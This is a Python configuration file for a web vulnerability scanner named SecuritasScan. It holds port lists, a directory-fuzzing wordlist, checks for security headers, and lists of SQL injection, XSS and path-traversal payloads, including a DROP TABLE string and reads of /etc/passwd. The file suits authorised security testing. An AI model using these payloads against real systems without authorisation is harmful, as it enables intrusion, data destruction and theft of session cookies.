"""
Security Toolkit - Configuration
"""

import os

# General
VERSION = "1.0.0"
TOOL_NAME = "SecuritasScan"

# Scanner defaults
DEFAULT_TIMEOUT = 3
DEFAULT_THREADS = 50
DEFAULT_USER_AGENT = "Mozilla/5.0 (compatible; SecurityScanner/1.0)"

# Port ranges
TOP_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445,
    993, 995, 1723, 3306, 3389, 5900, 8080, 8443, 8888, 9090, 9200, 27017
]

FULL_PORT_RANGE = range(1, 65536)

# Common directories for fuzzing
COMMON_DIRS = [
    "admin", "administrator", "login", "wp-admin", "phpmyadmin",
    "dashboard", "api", "v1", "v2", "backup", "config", "uploads",
    ".git", ".env", "robots.txt", "sitemap.xml", "swagger", "docs",
    "console", "shell", "test", "debug", "staging", "dev", "old",
    "tmp", "log", "logs", "error", "errors", "secret", "private",
]

# SQL Injection payloads
SQLI_PAYLOADS = [
    "'", '"', "' OR '1'='1", "' OR 1=1--", '" OR 1=1--',
    "' OR 'x'='x", "'; DROP TABLE users--", "' UNION SELECT NULL--",
    "1' AND SLEEP(5)--", "1; WAITFOR DELAY '0:0:5'--",
    "' AND 1=CONVERT(int,@@version)--",
    "' OR 1=1 LIMIT 1--", "admin'--", "' OR ''='",
]

SQLI_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql", "unclosed quotation mark",
    "quoted string not properly terminated",
    "postgresql", "ora-01756", "microsoft ole db",
    "odbc microsoft access", "syntax error",
    "mysql_fetch", "pg_query", "sqlite",
]

# XSS payloads
XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    "';alert('XSS')//",
    '<svg onload=alert(1)>',
    '"><img src=x onerror=alert(document.cookie)>',
    '<body onload=alert(1)>',
    'javascript:alert(1)',
    '<iframe src="javascript:alert(1)">',
]

# LFI payloads
LFI_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "....//....//etc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    "..%2fetc%2fpasswd",
    "..%252fetc%252fpasswd",
    "/etc/passwd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "..\\..\\Windows\\System32\\drivers\\etc\\hosts",
]

LFI_INDICATORS = [
    "root:x:0:0", "daemon:", "bin/bash", "bin/sh",
    "[boot loader]", "extension=", "windows", "system32",
]

# Security headers to check
SECURITY_HEADERS = {
    "Strict-Transport-Security": "HSTS not set",
    "X-Frame-Options": "Clickjacking possible",
    "X-Content-Type-Options": "MIME sniffing possible",
    "Content-Security-Policy": "CSP not configured",
    "X-XSS-Protection": "XSS protection header missing",
    "Referrer-Policy": "Referrer policy not set",
    "Permissions-Policy": "Permissions policy not set",
}

# Web server signatures to detect
SERVER_SIGNATURES = {
    "Server", "X-Powered-By", "X-AspNet-Version",
    "X-Generator", "X-Drupal-Cache", "X-WordPress-Cache",
}

# Flask API settings
API_HOST = "0.0.0.0"
API_PORT = 5000
API_DEBUG = False
SECRET_KEY = os.urandom(24).hex()

# Output colors (ANSI)
class Colors:
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    WHITE   = "\033[97m"
    BOLD    = "\033[1m"
    RESET   = "\033[0m"
